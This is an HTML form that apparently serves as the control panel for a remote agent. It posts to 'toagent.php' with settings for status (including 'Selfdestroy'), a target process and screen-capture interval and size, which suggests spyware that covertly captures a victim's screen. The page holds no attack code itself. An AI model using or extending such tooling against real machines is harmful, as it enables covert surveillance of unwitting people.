
<html><head>
<link rel="stylesheet" type="text/css" href="../src/main.css" />
</head><body>
<form action="toagent.php" method="POST">
<table class='pretty-table'>
<tr><td>
Status:
</td><td>
<select name="status">
  <option value="Active">Active</option>
  <option value="Sleep">Sleep</option>
  <option value="Selfdestroy">Selfdestroy</option>
</select>
</td></tr>
<tr><td>
Target process:
</td><td>
<input type="text" name="targetProcess" value="">
</td></tr>
<tr><td>
Screen capturer interval:
</td><td>
<input type="number" name="screenCapturerInterval" value="30000">
</td></tr>
<tr><td>
Screen width:
</td><td>
<input type="number" name="screenWidth" value="800">
</td></tr>
<tr><td>
Screen height:
</td><td>
<input type="number" name="screenHeight" value="600">
</td></tr>
<tr><td colspan="2">
<center>
<button type="submit" value="Submit">Submit</button>
</center>
</td></tr>
</table>
</form> 
</body>
</html>

